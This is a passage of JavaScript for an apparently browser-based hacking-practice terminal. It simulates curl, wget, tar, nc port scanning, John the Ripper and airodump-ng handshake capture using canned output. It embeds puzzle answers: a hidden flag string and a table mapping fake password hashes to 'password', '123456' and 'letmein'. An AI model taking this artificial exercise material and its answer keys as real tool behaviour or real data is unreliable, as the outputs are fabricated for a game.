                } else if (args[i] === '-s' || args[i] === '--silent') {
                    silent = true;
                } else if (!args[i].startsWith('-')) {
                    url = args[i];
                }
            }

            if (!url) {
                return 'curl: no URL specified';
            }

            // Remove protocol if present
            url = url.replace(/^https?:\/\//, '');
            const hostname = url.split('/')[0];
            const path = '/' + url.split('/').slice(1).join('/');

            // Resolve hostname
            const resolvedIP = resolveHostname(hostname);

            if (showHeaders) {
                // Show HTTP headers only
                return `HTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: ${new Date().toUTCString()}\nContent-Type: text/html; charset=UTF-8\nContent-Length: 1024\nConnection: keep-alive\nLast-Modified: ${new Date(Date.now() - 86400000).toUTCString()}\nETag: "5f8e9d7c-400"\nAccept-Ranges: bytes`;
            }

            // Generate realistic HTML content
            const htmlContent = `<!DOCTYPE html>\n<html>\n<head>\n    <title>${hostname}</title>\n    <meta charset="UTF-8">\n</head>\n<body>\n    <h1>Welcome to ${hostname}</h1>\n    <p>This is a simulated web page.</p>\n    <p>IP Address: ${resolvedIP}</p>\n    <p>Requested Path: ${path}</p>\n</body>\n</html>`;

            if (outputFile) {
                // Save to file
                if (createFile(outputFile, htmlContent, false, environment.CWD)) {
                    if (!silent) {
                        return `  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n100  ${htmlContent.length}  100  ${htmlContent.length}    0     0  12345      0 --:--:-- --:--:-- --:--:-- 12500`;
                    }
                    return '';
                } else {
                    return `curl: (23) Failed writing body`;
                }
            }

            // Display content
            return htmlContent;
        }
    },

    wget: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'wget: missing URL\nUsage: wget [OPTION]... [URL]...';
            }

            let url = args[1];
            let outputFilename = null;

            // Parse -O flag for output filename
            const outputIndex = args.indexOf('-O');
            if (outputIndex !== -1 && outputIndex + 1 < args.length) {
                outputFilename = args[outputIndex + 1];
            }

            // Remove protocol if present
            url = url.replace(/^https?:\/\//, '');
            const hostname = url.split('/')[0];
            const path = '/' + url.split('/').slice(1).join('/');
            const filename = outputFilename || path.split('/').pop() || 'index.html';

            // Resolve hostname
            const resolvedIP = resolveHostname(hostname);

            // Generate content
            const content = `<!DOCTYPE html>\n<html>\n<head>\n    <title>${hostname}</title>\n</head>\n<body>\n    <h1>${hostname}</h1>\n    <p>Downloaded content from ${hostname}</p>\n</body>\n</html>`;

            // Show wget output
            const output = document.createElement('div');
            output.className = 'tk-terminal-output';
            output.textContent = `--${new Date().toISOString().substring(0, 19).replace('T', ' ')}--  http://${hostname}${path}\nResolving ${hostname}... ${resolvedIP}\nConnecting to ${hostname}|${resolvedIP}|:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: ${content.length} (${(content.length / 1024).toFixed(1)}K) [text/html]\nSaving to: '${filename}'`;
            ctx.terminalInnerContent.appendChild(output);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            // Simulate download progress
            const progressOutput = document.createElement('div');
            progressOutput.className = 'tk-terminal-output';
            ctx.terminalInnerContent.appendChild(progressOutput);

            const totalBytes = content.length;
            let downloaded = 0;
            const chunkSize = Math.ceil(totalBytes / 10);

            while (downloaded < totalBytes) {
                // Check for interruption
                if (window.isCommandInterrupted) {
                    ctx.terminalInnerContent.removeChild(progressOutput);
                    return null;
                }

                downloaded = Math.min(downloaded + chunkSize, totalBytes);
                const percent = Math.floor((downloaded / totalBytes) * 100);
                const bars = Math.floor(percent / 2);
                const spaces = Math.max(0, 49 - bars); // Ensure non-negative
                const progressBar = '='.repeat(bars) + (bars < 50 ? '>' : '') + ' '.repeat(spaces);

                progressOutput.textContent = `${filename}              ${percent}%[${progressBar}] ${downloaded.toLocaleString()}  --.-KB/s    in 0.1s`;

                await new Promise(resolve => setTimeout(resolve, 50));
            }

            // Save file
            if (createFile(filename, content, false, environment.CWD)) {
                const completionOutput = document.createElement('div');
                completionOutput.className = 'tk-terminal-output';
                completionOutput.textContent = `\n${new Date().toISOString().substring(0, 19).replace('T', ' ')} (12.5 KB/s) - '${filename}' saved [${totalBytes}/${totalBytes}]`;
                ctx.terminalInnerContent.appendChild(completionOutput);
                ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
            }

            return null;
        }
    },

    chmod: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return '';
        }
    },

    chown: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return '';
        }
    },

    tar: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 3) {
                return 'tar: You must specify one of the \'-Acdtrux\', \'--delete\' or \'--test-label\' options\nTry \'tar --help\' or \'tar --usage\' for more information.';
            }

            const flags = args[1];
            const archiveName = args[2];
            const isCreate = flags.includes('c');
            const isExtract = flags.includes('x');
            const isCompress = flags.includes('z');
            const verbose = flags.includes('v');
            const useFile = flags.includes('f');

            if (isCreate) {
                // Create archive
                const targetPath = args[3] || environment.CWD;
                const resolvedPath = resolvePath(targetPath, environment.CWD);

                // Collect files to archive
                const files = [];
                function collectFiles(dirPath, basePath = '') {
                    const dir = getDirectory(dirPath);
                    if (dir && dir.contents) {
                        for (const itemName in dir.contents) {
                            const itemPath = resolvePath(itemName, dirPath);
                            const relativePath = basePath ? `${basePath}/${itemName}` : itemName;
                            const item = dir.contents[itemName];

                            if (item.type === 'file') {
                                files.push({ path: relativePath, content: item.content || '' });
                                if (verbose) {
                                    const output = document.createElement('div');
                                    output.className = 'tk-terminal-output';
                                    output.textContent = relativePath;
                                    ctx.terminalInnerContent.appendChild(output);
                                }
                            } else if (item.type === 'directory') {
                                collectFiles(itemPath, relativePath);
                            }
                        }
                    }
                }

                const targetDir = getDirectory(resolvedPath);
                const targetFile = getFile(resolvedPath);

                if (targetFile) {
                    // Single file
                    const content = readFile(targetPath, environment.CWD);
                    if (content !== false) {
                        files.push({ path: targetPath.split('/').pop(), content });
                    }
                } else if (targetDir) {
                    // Directory
                    collectFiles(resolvedPath, targetPath.split('/').pop());
                }

                if (files.length === 0) {
                    return `tar: ${targetPath}: Cannot stat: No such file or directory`;
                }

                // Create archive content (simplified representation)
                let archiveContent = `TAR_ARCHIVE\n`;
                files.forEach(f => {
                    archiveContent += `FILE:${f.path}:${f.content.length}\n${f.content}\n`;
                });

                if (createFile(archiveName, archiveContent, false, environment.CWD)) {
                    return null;
                } else {
                    return `tar: ${archiveName}: Cannot write: Permission denied`;
                }

            } else if (isExtract) {
                // Extract archive
                const archiveContent = readFile(archiveName, environment.CWD);
                if (archiveContent === false) {
                    return `tar: ${archiveName}: Cannot open: No such file or directory`;
                }

                if (!archiveContent.startsWith('TAR_ARCHIVE')) {
                    return `tar: This does not look like a tar archive`;
                }

                // Parse and extract files
                const lines = archiveContent.split('\n');
                let i = 1; // Skip header
                while (i < lines.length) {
                    if (lines[i].startsWith('FILE:')) {
                        const parts = lines[i].substring(5).split(':');
                        const fileName = parts[0];
                        const fileSize = parseInt(parts[1]);
                        i++;
                        const fileContent = lines.slice(i, i + Math.ceil(fileSize / 100)).join('\n');

                        if (createFile(fileName, fileContent, false, environment.CWD)) {
                            if (verbose) {
                                const output = document.createElement('div');
                                output.className = 'tk-terminal-output';
                                output.textContent = fileName;
                                ctx.terminalInnerContent.appendChild(output);
                            }
                        }

                        i += Math.ceil(fileSize / 100);
                    } else {
                        i++;
                    }
                }

                return null;
            }

            return 'tar: You must specify one of the \'-Acdtrux\', \'--delete\' or \'--test-label\' options';
        }
    },

    gzip: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'gzip: compressed data not written to a terminal. Use -f to force compression.\nFor help, type: gzip -h';
            }

            const isDecompress = args.includes('-d') || args.includes('--decompress');
            const fileArg = args.find(arg => !arg.startsWith('-') && arg !== 'gzip');

            if (!fileArg) {
                return 'gzip: missing file operand';
            }

            if (isDecompress) {
                // Decompress
                const gzipName = fileArg.endsWith('.gz') ? fileArg : fileArg + '.gz';
                const content = readFile(gzipName, environment.CWD);

                if (content === false) {
                    return `gzip: ${gzipName}: No such file or directory`;
                }

                if (!content.startsWith('GZIP_COMPRESSED:')) {
                    return `gzip: ${gzipName}: not in gzip format`;
                }

                // Extract original content
                const originalContent = content.substring(16); // Remove header
                const originalName = gzipName.replace(/\.gz$/, '');

                if (createFile(originalName, originalContent, false, environment.CWD)) {
                    // Delete the .gz file (simulate gzip behavior)
                    const parentDir = getDirectory(environment.CWD);
                    if (parentDir && parentDir.contents) {
                        delete parentDir.contents[gzipName];
                    }
                    return '';
                } else {
                    return `gzip: ${originalName}: Permission denied`;
                }

            } else {
                // Compress
                const content = readFile(fileArg, environment.CWD);

                if (content === false) {
                    return `gzip: ${fileArg}: No such file or directory`;
                }

                // Create compressed file (simulated with prefix)
                const compressedContent = 'GZIP_COMPRESSED:' + content;
                const gzipName = fileArg + '.gz';

                if (createFile(gzipName, compressedContent, false, environment.CWD)) {
                    // Delete original file (simulate gzip behavior)
                    const parentDir = getDirectory(environment.CWD);
                    if (parentDir && parentDir.contents) {
                        delete parentDir.contents[fileArg];
                    }
                    return '';
                } else {
                    return `gzip: ${gzipName}: Permission denied`;
                }
            }
        }
    },

    apt: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            // Check if running as root
            if (environment.USER !== 'root') {
                return `E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\nE: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?`;
            }

            if (args.length < 2) {
                return `apt 2.4.11 (amd64)
Usage: apt [options] command

Most used commands:
  list - list packages based on package names
  search - search in package descriptions
  show - show package details
  install - install packages
  remove - remove packages
  update - update list of available packages
  upgrade - upgrade the system by installing/upgrading packages`;
            }

            const subCommand = args[1];

            if (subCommand === 'update') {
                return `Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
Hit:2 http://archive.ubuntu.com/ubuntu jammy-updates InRelease
Hit:3 http://security.ubuntu.com/ubuntu jammy-security InRelease
Reading package lists... Done
Building dependency tree... Done
All packages are up to date.`;
            } else if (subCommand === 'upgrade') {
                return `Reading package lists... Done
Building dependency tree... Done
Calculating upgrade... Done
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.`;
            } else if (subCommand === 'install') {
                if (args.length < 3) {
                    return 'E: You must give at least one package name';
                }
                const pkg = args[2];
                return `Reading package lists... Done
Building dependency tree... Done
${pkg} is already the newest version.
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.`;
            } else if (subCommand === 'remove') {
                if (args.length < 3) {
                    return 'E: You must give at least one package name';
                }
                const pkg = args[2];
                return `Reading package lists... Done
Building dependency tree... Done
Package '${pkg}' is not installed, so not removed.
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.`;
            } else if (subCommand === 'list') {
                return `Listing...`;
            } else if (subCommand === 'search') {
                if (args.length < 3) {
                    return 'E: You must give at least one search pattern';
                }
                return `Sorting... Done
Full Text Search... Done`;
            } else if (subCommand === 'show') {
                if (args.length < 3) {
                    return 'E: You must give at least one package name';
                }
                return `N: Unable to locate package ${args[2]}`;
            } else {
                return `E: Invalid operation ${subCommand}`;
            }
        }
    },

    dpkg: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            // Check if running as root for most operations
            if (args.length > 1 && (args[1] === '-i' || args[1] === '-r' || args[1] === '-P')) {
                if (environment.USER !== 'root') {
                    return `dpkg: error: requested operation requires superuser privilege`;
                }
            }

            if (args.length < 2) {
                return `dpkg: error: need an action option

Type dpkg --help for help about installing and deinstalling packages.`;
            }

            if (args[1] === '-l' || args[1] === '--list') {
                return `Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name           Version      Architecture Description
+++-==============-============-============-=================================
ii  bash           5.1-6ubuntu1 amd64        GNU Bourne Again SHell
ii  coreutils      8.32-4.1ubun amd64        GNU core utilities
ii  libc6          2.35-0ubuntu amd64        GNU C Library: Shared libraries`;
            } else if (args[1] === '-s' || args[1] === '--status') {
                if (args.length < 3) {
                    return 'dpkg-query: error: --status needs at least one package name argument';
                }
                return `dpkg-query: package '${args[2]}' is not installed and no information is available`;
            } else if (args[1] === '--help') {
                return `Usage: dpkg [<option> ...] <command>

Commands:
  -i|--install       <.deb file name>... | -R|--recursive <directory>...
  -r|--remove        <package>... | -a|--pending
  -P|--purge         <package>... | -a|--pending
  -l|--list [<pattern>...]       List packages matching given pattern.
  -s|--status <package-name>...  Display package status details.`;
            } else {
                return `dpkg: error: unknown option ${args[1]}`;
            }
        }
    },

    nc: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 3) {
                return 'usage: nc [-options] hostname port[s] [ports] ...\n       nc -l -p port [options] [hostname] [port]';
            }

            const isListen = args.includes('-l');
            const zvMode = args.includes('-z') && args.includes('-v');

            if (isListen) {
                // Listen mode
                const portIndex = args.indexOf('-p');
                if (portIndex === -1 || portIndex + 1 >= args.length) {
                    return 'nc: option requires an argument -- p';
                }
                const port = args[portIndex + 1];

                const output = document.createElement('div');
                output.className = 'tk-terminal-output';
                output.textContent = `Listening on 0.0.0.0 ${port}`;
                ctx.terminalInnerContent.appendChild(output);
                ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

                // Wait for Ctrl+C
                await ctx.waitKey();
                return '^C';

            } else if (zvMode) {
                // Port scanning mode (-zv)
                const hostname = args.find(arg => !arg.startsWith('-') && arg !== 'nc');
                const portArg = args[args.length - 1];

                if (!hostname || !portArg) {
                    return 'nc: missing hostname or port';
                }

                // Resolve hostname
                const resolvedIP = resolveHostname(hostname);

                // Parse port range (e.g., "20-25" or single port)
                let ports = [];
                if (portArg.includes('-')) {
                    const [start, end] = portArg.split('-').map(Number);
                    for (let p = start; p <= end; p++) {
                        ports.push(p);
                    }
                } else {
                    ports.push(Number(portArg));
                }

                // Scan ports
                let output = '';
                for (const port of ports) {
                    // Common open ports
                    const openPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 5432, 8080];
                    const isOpen = openPorts.includes(port) || (Math.abs(hashString(hostname + port)) % 5 === 0);

                    if (isOpen) {
                        output += `Connection to ${hostname} ${port} port [tcp/*] succeeded!\n`;
                    } else {
                        output += `nc: connect to ${hostname} port ${port} (tcp) failed: Connection refused\n`;
                    }
                }

                return output.trim();

            } else {
                // Connect mode
                const hostname = args[1];
                const port = args[2];

                const resolvedIP = resolveHostname(hostname);

                // Check common services
                const services = {
                    '21': 'FTP',
                    '22': 'SSH',
                    '23': 'Telnet',
                    '25': 'SMTP',
                    '80': 'HTTP',
                    '110': 'POP3',
                    '143': 'IMAP',
                    '443': 'HTTPS',
                    '3306': 'MySQL'
                };

                const serviceName = services[port] || 'unknown';

                if (serviceName === 'SSH') {
                    return `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5`;
                } else if (serviceName === 'HTTP') {
                    return `HTTP/1.1 400 Bad Request\nServer: nginx/1.18.0\nDate: ${new Date().toUTCString()}\nContent-Type: text/html\nConnection: close`;
                } else if (serviceName === 'FTP') {
                    return `220 ${hostname} FTP server ready`;
                } else {
                    return `nc: connect to ${hostname} port ${port} (tcp) failed: Connection refused`;
                }
            }
        }
    },

    base64: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            const isDecode = args.includes('-d') || args.includes('--decode');

            // Get all non-flag arguments (excluding 'base64' itself)
            const nonFlagArgs = args.slice(1).filter(arg => !arg.startsWith('-'));

            if (nonFlagArgs.length === 0) {
                return 'base64: missing operand\nTry \'base64 --help\' for more information.';
            }

            // Get the input - first try as file, then as direct string
            let input = '';
            const potentialFile = nonFlagArgs[0];
            const fileContent = readFile(potentialFile, environment.CWD);

            if (fileContent !== false) {
                // It's a file, use its content
                input = fileContent;
            } else {
                // Not a file, treat all non-flag args as direct string input
                input = nonFlagArgs.join(' ');
            }

            if (isDecode) {
                try {
                    return atob(input.trim());
                } catch (e) {
                    return 'base64: invalid input';
                }
            } else {
                return btoa(input);
            }
        }
    },

    md5sum: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'md5sum: missing operand\nTry \'md5sum --help\' for more information.';
            }

            const filename = args[1];
            const content = readFile(filename, environment.CWD);

            if (content === false) {
                return `md5sum: ${filename}: No such file or directory`;
            }

            // Simple hash simulation (not real MD5)
            let hash = 0;
            for (let i = 0; i < content.length; i++) {
                hash = ((hash << 5) - hash) + content.charCodeAt(i);
                hash = hash & hash;
            }

            // Convert to hex-like string (32 chars)
            const hexHash = Math.abs(hash).toString(16).padStart(32, '0').substring(0, 32);
            return `${hexHash}  ${filename}`;
        }
    },

    sha256sum: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'sha256sum: missing operand\nTry \'sha256sum --help\' for more information.';
            }

            const filename = args[1];
            const content = readFile(filename, environment.CWD);

            if (content === false) {
                return `sha256sum: ${filename}: No such file or directory`;
            }

            // Simple hash simulation (not real SHA256)
            let hash = 5381;
            for (let i = 0; i < content.length; i++) {
                hash = ((hash << 5) + hash) + content.charCodeAt(i);
                hash = hash & hash;
            }

            // Convert to hex-like string (64 chars)
            const hexHash = Math.abs(hash).toString(16).padStart(64, '0').substring(0, 64);
            return `${hexHash}  ${filename}`;
        }
    },

    strings: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'strings: missing operand\nTry \'strings --help\' for more information.';
            }

            const filename = args[1];
            const content = readFile(filename, environment.CWD);

            if (content === false) {
                return `strings: ${filename}: No such file or directory`;
            }

            // Extract "strings" - sequences of printable characters
            // For simulation, just return lines that look like strings
            const lines = content.split('\n').filter(line => {
                // Keep lines that are at least 4 chars and mostly printable
                return line.length >= 4 && /^[\x20-\x7E\s]+$/.test(line);
            });

            // If it's a binary (ELF executable), add some realistic strings
            if (content === 'ELF executable') {
                return `/lib64/ld-linux-x86-64.so.2\nlibc.so.6\nputs\nprintf\n__libc_start_main\nGLIBC_2.2.5\n_ITM_deregisterTMCloneTable\n__gmon_start__\n_ITM_registerTMCloneTable\nFLAG{strings_are_fun}\n.symtab\n.strtab\n.shstrtab\n.text\n.data\n.bss`;
            }

            return lines.join('\n');
        }
    },

    john: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'John the Ripper 1.9.0-jumbo-1\nUsage: john [OPTIONS] [PASSWORD-FILES]\n--wordlist=FILE         wordlist mode, read words from FILE\n--show                  show cracked passwords\n--rules                 enable word mangling rules\n--incremental[=MODE]    incremental mode';
            }

            // Parse arguments
            let wordlistFile = null;
            let hashFile = null;
            let showMode = false;

            for (let i = 1; i < args.length; i++) {
                if (args[i].startsWith('--wordlist=')) {
                    wordlistFile = args[i].substring(11);
                } else if (args[i] === '--show') {
                    showMode = true;
                } else if (!args[i].startsWith('--')) {
                    hashFile = args[i];
                }
            }

            if (!hashFile) {
                return 'john: No password hashes specified';
            }

            // Initialize global john cracked passwords storage if it doesn't exist
            if (!window.johnCracked) {
                window.johnCracked = {};
            }

            const content = readFile(hashFile, environment.CWD);

            if (content === false) {
                return `john: ${hashFile}: No such file or directory`;
            }

            // Parse shadow file format or hash list
            const lines = content.split('\n').filter(line => line.includes(':'));

            if (lines.length === 0) {
                return 'john: No password hashes loaded';
            }

            // Handle --show mode
            if (showMode) {
                let results = [];
                for (const line of lines) {
                    const username = line.split(':')[0];
                    const hash = line.split(':')[1];
                    if (window.johnCracked[hash]) {
                        results.push(`${username}:${window.johnCracked[hash]}`);
                    }
                }
                if (results.length === 0) {
                    return 'No passwords cracked yet';
                }
                return results.join('\n') + `\n\n${results.length} password hash${results.length > 1 ? 'es' : ''} cracked, ${lines.length - results.length} left`;
            }

            // Load wordlist
            let wordlist = [];
            if (wordlistFile) {
                const wordlistContent = readFile(wordlistFile, environment.CWD);
                if (wordlistContent === false) {
                    return `john: ${wordlistFile}: No such file or directory`;
                }
                wordlist = wordlistContent.split('\n').filter(w => w.trim().length > 0);

                if (wordlist.length === 0) {
                    return 'john: Wordlist is empty';
                }
            } else {
                return 'john: No wordlist specified. Use --wordlist=FILE';
            }

            // Create a mapping of hashes to passwords for simulation
            // Only these passwords will work if they're in the wordlist
            const hashToPassword = {
                '$6$salt$5H0tMmUm7cxX8uQn3q9w1rY4vP2lK6jD8fE3gB9hN7sA4mT1vR0pL5kJ6hG8fD3s': 'password',
                '$6$salt$2F8kLmPq3rT5nY9wX1vU7hJ4gD6sA8mB2cN1vM9rT4pL6hK8jF5gD3sA1nM7vR9p': '123456',
                '$6$salt$3N9mPr2tY5wV8xU1hK7jL4gF6sD8aM2bC3nV1mR9tP4lH6kJ8fG5dS3aM7nV1rP9': 'letmein'
            };

            // Simulate cracking
            const output = document.createElement('div');
            output.className = 'tk-terminal-output';
            output.textContent = `Loaded ${lines.length} password hash${lines.length > 1 ? 'es' : ''} (crypt, generic crypt(3) [?/64])\nUsing wordlist: ${wordlistFile}\nPress 'q' or Ctrl+C to abort, almost any other key for status`;
            ctx.terminalInnerContent.appendChild(output);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            let cracked = [];
            let tried = 0;

            for (let i = 0; i < lines.length; i++) {
                const line = lines[i];
                const username = line.split(':')[0];
                const hash = line.split(':')[1];

                // Skip if already cracked
                if (window.johnCracked[hash]) {
                    continue;
                }

                // Try to crack using wordlist - MUST be in wordlist to work
                let found = false;
                for (const word of wordlist) {
                    tried++;

                    // Check for interruption
                    if (window.isCommandInterrupted) {
                        const interruptOutput = document.createElement('div');
                        interruptOutput.className = 'tk-terminal-output';
                        interruptOutput.textContent = '\nSession aborted';
                        ctx.terminalInnerContent.appendChild(interruptOutput);
                        ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
                        return null;
                    }

                    // Check if this hash matches AND the password is in the wordlist
                    if (hashToPassword[hash] === word) {
                        // Simulate delay
                        await new Promise(resolve => setTimeout(resolve, 100));

                        const statusOutput = document.createElement('div');
                        statusOutput.className = 'tk-terminal-output';
                        statusOutput.textContent = `${word}             (${username})`;
                        ctx.terminalInnerContent.appendChild(statusOutput);
                        ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

                        cracked.push(`${username}:${word}`);
                        window.johnCracked[hash] = word; // Store cracked password
                        found = true;
                        break;
                    }

                    // Update progress every 100 tries
                    if (tried % 100 === 0) {
                        await new Promise(resolve => setTimeout(resolve, 10));
                    }
                }

                if (!found) {
                    await new Promise(resolve => setTimeout(resolve, 50));
                }
            }

            const finalOutput = document.createElement('div');
            finalOutput.className = 'tk-terminal-output';
            if (cracked.length > 0) {
                finalOutput.textContent = `\n${cracked.length}g 0:00:00:0${Math.ceil(tried/100)} DONE (${new Date().toISOString().substring(0, 19)}) ${cracked.length}/${lines.length} (${Math.floor(cracked.length/lines.length*100)}%)\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed`;
            } else {
                finalOutput.textContent = `\n0g 0:00:00:0${Math.ceil(tried/100)} DONE (${new Date().toISOString().substring(0, 19)})\nNo passwords cracked. The passwords may not be in your wordlist.\nSession completed`;
            }
            ctx.terminalInnerContent.appendChild(finalOutput);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            return null;
        }
    },

    'airodump-ng': {
        isBuiltin: false,
        execute: async (args, ctx) => {
            // Check if user is root
            if (environment.USER !== 'root') {
                return 'airodump-ng: You must be root to run airodump-ng';
            }

            // Parse arguments
            let channel = null;
            let bssid = null;
            let iface = 'wlan0';
            let writePrefix = null;

            for (let i = 1; i < args.length; i++) {
                if (args[i] === '-c' && i + 1 < args.length) {
                    channel = args[i + 1];
                    i++;
                } else if (args[i] === '--bssid' && i + 1 < args.length) {
                    bssid = args[i + 1];
                    i++;
                } else if (args[i] === '-w' && i + 1 < args.length) {
                    writePrefix = args[i + 1];
                    i++;
                } else if (!args[i].startsWith('-')) {
                    iface = args[i];
                }
            }

            if (args.length < 2) {
                return 'Airodump-ng 1.6\n\nUsage: airodump-ng <options> <interface>\n\nOptions:\n    -c <channel>     : Capture on specific channel\n    --bssid <bssid>  : Filter by access point BSSID\n    -w <prefix>      : Write capture file prefix';
            }

            // Initialize WiFi networks if not already done
            if (!window.wifiNetworks) {
                window.wifiNetworks = [
                    {
                        bssid: '00:14:6C:7E:40:80',
                        essid: 'SecureNet-5G',
                        channel: 36,
                        power: -45,
                        encryption: 'WPA2',
                        beacons: 0,
                        data: 0,
                        clients: []
                    },
                    {
                        bssid: 'A4:08:F5:2D:39:E1',
                        essid: 'HomeNetwork',
                        channel: 6,
                        power: -52,
                        encryption: 'WPA2',
                        beacons: 0,
                        data: 0,
                        clients: ['B8:27:EB:4F:9C:D2']
                    },
                    {
                        bssid: 'C8:3A:35:B0:24:68',
                        essid: 'CoffeeShop',
                        channel: 11,
                        power: -67,
                        encryption: 'WPA2',
                        beacons: 0,
                        data: 0,
                        clients: []
                    },
                    {
                        bssid: 'F4:EC:38:D1:5A:7C',
                        essid: 'Guest_WiFi',
                        channel: 1,
                        power: -72,
                        encryption: 'WPA2',
                        beacons: 0,
                        data: 0,
                        clients: ['DC:A6:32:8E:1B:F3']
                    }
                ];
            }

            // Filter networks by channel or bssid
            let networks = window.wifiNetworks;
            if (channel) {
                networks = networks.filter(n => n.channel === parseInt(channel));
            }
            if (bssid) {
                networks = networks.filter(n => n.bssid.toLowerCase() === bssid.toLowerCase());
            }

            if (networks.length === 0) {
                return `airodump-ng: No networks found${channel ? ' on channel ' + channel : ''}${bssid ? ' with BSSID ' + bssid : ''}`;
            }

            // Save current terminal content and clear it
            const savedContent = ctx.terminalInnerContent.innerHTML;
            ctx.terminalInnerContent.innerHTML = '';

            // Create a single output div that we'll update in place
            const output = document.createElement('div');
            output.className = 'tk-terminal-output';
            output.style.whiteSpace = 'pre';
            ctx.terminalInnerContent.appendChild(output);

            // Track if handshake was captured
            let handshakeCaptured = false;
            let handshakeBssid = null;

            // Simulate capture - run indefinitely until Ctrl+C
            let cycle = 0;
            while (true) {
                if (window.isCommandInterrupted) {
                    // Restore original terminal content
                    ctx.terminalInnerContent.innerHTML = savedContent;

                    // Always write file when Ctrl+C is pressed if -w flag was used
                    if (writePrefix) {
                        const captureFile = `${writePrefix}-01.cap`;

                        // Find the network that had the handshake (if any)
                        let capturedNetwork = null;
                        if (handshakeCaptured) {
                            capturedNetwork = networks.find(n => n.bssid === handshakeBssid);
                        }

                        // Create capture file - only include handshake if it was captured
                        let fileContent = '';
                        if (handshakeCaptured && capturedNetwork) {
                            fileContent = `WPA2 Handshake captured for ${capturedNetwork.essid} (${capturedNetwork.bssid})\nBSSID: ${capturedNetwork.bssid}\nESSID: ${capturedNetwork.essid}\nThis is a simulated capture file containing the 4-way handshake.`;
                        } else {
                            fileContent = `Capture file for network scan\nNo handshake captured.\nThis is a simulated capture file.`;
                        }

                        createFile(captureFile, fileContent, false, environment.CWD, environment.USER, 'root');

                        const finalOutput = document.createElement('div');
                        finalOutput.className = 'tk-terminal-output';
                        if (handshakeCaptured) {
                            finalOutput.textContent = `\n [ WPA handshake: ${handshakeBssid} ]\nSaved to ${captureFile}\n\nQuitting...`;
                        } else {
                            finalOutput.textContent = `\nNo handshake captured.\nSaved to ${captureFile}\n\nQuitting...`;
                        }
                        ctx.terminalInnerContent.appendChild(finalOutput);
                    } else {
                        const finalOutput = document.createElement('div');
                        finalOutput.className = 'tk-terminal-output';
                        finalOutput.textContent = '\nQuitting...';
                        ctx.terminalInnerContent.appendChild(finalOutput);
                    }

                    ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
                    return null;
                }

                // Update network stats
                for (const network of networks) {
                    network.beacons += Math.floor(Math.random() * 5) + 1;
                    network.data += Math.floor(Math.random() * 3);
                }

                // Check for handshake capture (once per network, after some time)
                // Only capture if writing to file and network has clients
                if (!handshakeCaptured && writePrefix && cycle > 3 && Math.random() > 0.85) {
                    // Try to capture handshake from a network with clients
                    for (const network of networks) {
                        if (network.clients.length > 0) {
                            handshakeCaptured = true;
                            handshakeBssid = network.bssid;
                            break;
                        }
                    }
                }

                // Build output with handshake indicator at top
                let outputText = '';

                // Header line with handshake on the same line
                const headerLine = ` CH ${(channel || networks[0].channel).toString().padStart(2)} ][ Elapsed: ${Math.floor(cycle / 2)} s ][ ${new Date().toISOString().substring(0, 19)} ]`;
                if (handshakeCaptured) {
                    outputText += headerLine + ` [ WPA handshake: ${handshakeBssid} ]\n\n`;
                } else {
                    outputText += headerLine + '\n\n';
                }

                // Column headers - properly aligned
                outputText += ' BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID\n\n';

                // Build network list with proper alignment
                for (const network of networks) {
                    const bssidPart = network.bssid.padEnd(17);
                    const pwrPart = network.power.toString().padStart(4);
                    const beaconsPart = network.beacons.toString().padStart(8);
                    const dataPart = network.data.toString().padStart(8);
                    const perSecPart = Math.floor(Math.random() * 5).toString().padStart(4);
                    const channelPart = network.channel.toString().padStart(3);
                    const essidPart = network.essid;

                    outputText += ` ${bssidPart} ${pwrPart} ${beaconsPart} ${dataPart},${perSecPart} ${channelPart}  54e  ${network.encryption}  CCMP   PSK  ${essidPart}\n`;

                    // Show clients
                    for (const client of network.clients) {
                        const clientBssid = client.padEnd(17);
                        const clientPwr = ('-' + (Math.floor(Math.random() * 30 + 40))).padStart(4);
                        const clientBeacons = Math.floor(Math.random() * 10).toString().padStart(8);
                        const clientData = Math.floor(Math.random() * 5).toString().padStart(8);
                        const clientPerSec = Math.floor(Math.random() * 3).toString().padStart(4);

                        outputText += ` ${clientBssid} ${clientPwr} ${clientBeacons} ${clientData},${clientPerSec}             (not associated)\n`;
                    }
                }

